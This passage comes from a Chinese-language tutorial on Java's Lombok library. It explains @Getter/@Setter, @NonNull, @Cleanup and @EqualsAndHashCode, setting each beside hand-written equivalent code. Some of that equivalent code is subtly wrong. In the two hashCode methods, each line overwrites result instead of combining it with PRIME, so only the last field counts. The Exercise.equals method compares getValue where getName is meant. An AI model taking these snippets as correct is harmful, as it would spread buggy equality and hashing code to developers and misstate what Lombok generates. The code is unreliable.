    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">final</span> <span class="token keyword">int</span> <span class="token constant">PRIME</span> <span class="token operator">=</span> <span class="token number">59</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> result <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token keyword">final</span> <span class="token keyword">long</span> temp1 <span class="token operator">=</span> <span class="token class-name">Double</span><span class="token punctuation">.</span><span class="token function">doubleToLongBits</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getScore</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token number">43</span> <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        result <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>temp1 <span class="token operator">^</span> <span class="token punctuation">(</span>temp1 <span class="token operator">&gt;&gt;&gt;</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        result <span class="token operator">=</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">deepHashCode</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getTags</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> result<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Exercise</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token punctuation">{</span>
        <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>
        <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token class-name">T</span> value<span class="token punctuation">;</span>

        <span class="token keyword">private</span> <span class="token class-name">Exercise</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">T</span> value<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>value <span class="token operator">=</span> value<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token class-name">Exercise</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token function">of</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">T</span> value<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Exercise</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">public</span> <span class="token class-name">T</span> <span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token annotation punctuation">@Override</span>
        <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token string">"Exercise(name="</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", value="</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">")"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">protected</span> <span class="token keyword">boolean</span> <span class="token function">canEqual</span><span class="token punctuation">(</span><span class="token class-name">Object</span> other<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> other <span class="token keyword">instanceof</span> <span class="token class-name">Exercise</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token annotation punctuation">@Override</span>
        <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">Object</span> o<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>o <span class="token operator">==</span> <span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>o <span class="token keyword">instanceof</span> <span class="token class-name">Exercise</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
            <span class="token class-name">Exercise</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> other <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Exercise</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">)</span> o<span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>other<span class="token punctuation">.</span><span class="token function">canEqual</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">)</span> <span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> other<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">:</span> <span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>other<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> other<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">:</span> <span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>other<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token annotation punctuation">@Override</span>
        <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">final</span> <span class="token keyword">int</span> <span class="token constant">PRIME</span> <span class="token operator">=</span> <span class="token number">59</span><span class="token punctuation">;</span>
            <span class="token keyword">int</span> result <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
            result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token number">43</span> <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">?</span> <span class="token number">43</span> <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> result<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="Getter-Setter">@Getter/@Setter</h2>
<p>如果觉得<code>@Data</code>太过残暴（因为<code>@Data</code>集合了<code>@ToString</code>、<code>@EqualsAndHashCode</code>、<code>@Getter/@Setter</code>、<code>@RequiredArgsConstructor</code>的所有特性）<code> </code>不够精细，可以使用<code>@Getter/@Setter</code>注解，此注解在属性上，可以为相应的属性自动生成<code>Getter/Setter</code>方法，示例如下：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span></span><span class="token class-name">AccessLevel</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span></span><span class="token class-name">Getter</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span></span><span class="token class-name">Setter</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">GetterSetterExample</span> <span class="token punctuation">{</span>

  <span class="token annotation punctuation">@Getter</span>
  <span class="token annotation punctuation">@Setter</span>
  <span class="token keyword">private</span> <span class="token keyword">int</span> age <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>

  <span class="token annotation punctuation">@Setter</span><span class="token punctuation">(</span><span class="token class-name">AccessLevel</span><span class="token punctuation">.</span><span class="token constant">PROTECTED</span><span class="token punctuation">)</span>
  <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>

  <span class="token annotation punctuation">@Override</span>
  <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"%s (age: %d)"</span><span class="token punctuation">,</span> name<span class="token punctuation">,</span> age<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>如果不使用Lombok：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">GetterSetterExample</span> <span class="token punctuation">{</span>

  <span class="token keyword">private</span> <span class="token keyword">int</span> age <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
  <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>

  <span class="token annotation punctuation">@Override</span>
  <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"%s (age: %d)"</span><span class="token punctuation">,</span> name<span class="token punctuation">,</span> age<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> age<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="NonNull">@NonNull</h2>
<p>该注解用在属性或构造器上，Lombok会生成一个非空的声明，可用于校验参数，能帮助避免空指针。<strong>主要作用于成员变量和参数中，标识不能为空，否则抛出空指针异常</strong>。 示例如下：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span></span><span class="token class-name">NonNull</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">NonNullExample</span> <span class="token keyword">extends</span> <span class="token class-name">Something</span> <span class="token punctuation">{</span>

  <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>

  <span class="token keyword">public</span> <span class="token class-name">NonNullExample</span><span class="token punctuation">(</span><span class="token annotation punctuation">@NonNull</span> <span class="token class-name">Person</span> person<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token string">"Hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> person<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>不使用Lombok</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span></span><span class="token class-name">NonNull</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">NonNullExample</span> <span class="token keyword">extends</span> <span class="token class-name">Something</span> <span class="token punctuation">{</span>

  <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>

  <span class="token keyword">public</span> <span class="token class-name">NonNullExample</span><span class="token punctuation">(</span><span class="token annotation punctuation">@NonNull</span> <span class="token class-name">Person</span> person<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token string">"Hello"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>person <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">NullPointerException</span><span class="token punctuation">(</span><span class="token string">"person"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> person<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="Cleanup">@Cleanup</h2>
<p>@Cleanup：自动关闭资源，针对实现了<strong>java.io.Closeable</strong>接口的对象有效，如：典型的<strong>IO流对象</strong><br>
示例如下：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span></span><span class="token class-name">Cleanup</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CleanupExample</span> <span class="token punctuation">{</span>
  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>
    <span class="token annotation punctuation">@Cleanup</span>
    <span class="token class-name">InputStream</span> in <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token annotation punctuation">@Cleanup</span>
    <span class="token class-name">OutputStream</span> out <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">10000</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">int</span> r <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>r <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>
      out<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>如不使用Lombok，则需如下：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CleanupExample</span> <span class="token punctuation">{</span>

  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>
    <span class="token class-name">InputStream</span> in <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">try</span> <span class="token punctuation">{</span>
      <span class="token class-name">OutputStream</span> out <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">try</span> <span class="token punctuation">{</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">10000</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          <span class="token keyword">int</span> r <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>r <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>
          out<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>out <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
          out<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>in <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        in<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="EqualsAndHashCodes">@EqualsAndHashCodes</h2>
<p>​		默认情况下，会使用所有非静态（non-static）和非瞬态（non-transient）属性来生成equals和hasCode，也能通过exclude注解来排除一些属性。<strong>作用于类，覆盖默认的equals和hashCode</strong><br>
示例如下</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">lombok<span class="token punctuation">.</span></span><span class="token class-name">EqualsAndHashCode</span></span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@EqualsAndHashCode</span><span class="token punctuation">(</span>exclude <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token string">"id"</span><span class="token punctuation">,</span> <span class="token string">"shape"</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EqualsAndHashCodeExample</span> <span class="token punctuation">{</span>

  <span class="token keyword">private</span> <span class="token keyword">transient</span> <span class="token keyword">int</span> transientVar <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>
  <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>
  <span class="token keyword">private</span> <span class="token keyword">double</span> score<span class="token punctuation">;</span>
  <span class="token keyword">private</span> <span class="token class-name">Shape</span> shape <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Square</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">private</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> tags<span class="token punctuation">;</span>
  <span class="token keyword">private</span> <span class="token keyword">int</span> id<span class="token punctuation">;</span>

  <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token annotation punctuation">@EqualsAndHashCode</span><span class="token punctuation">(</span>callSuper <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">)</span>
  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Square</span> <span class="token keyword">extends</span> <span class="token class-name">Shape</span> <span class="token punctuation">{</span>

    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">int</span> width<span class="token punctuation">,</span> height<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">Square</span><span class="token punctuation">(</span><span class="token keyword">int</span> width<span class="token punctuation">,</span> <span class="token keyword">int</span> height<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span>width <span class="token operator">=</span> width<span class="token punctuation">;</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span>height <span class="token operator">=</span> height<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="ToString">@ToString</h2>
